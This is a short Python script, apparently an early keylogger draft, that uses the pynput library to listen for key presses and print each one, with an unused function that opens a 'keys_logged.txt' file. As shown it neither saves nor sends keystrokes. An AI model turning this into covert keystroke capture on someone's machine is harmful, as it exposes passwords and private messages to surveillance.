from pynput.keyboard import Key, Listener


#this function creates a txt file
def create_txt():
   keys_logged_file = open("keys_logged.txt", "a")

#this function prints the pressed key
def on_press(key):
   print(key)

while True:
   with Listener(on_press = on_press) as listener:
      listener.join()
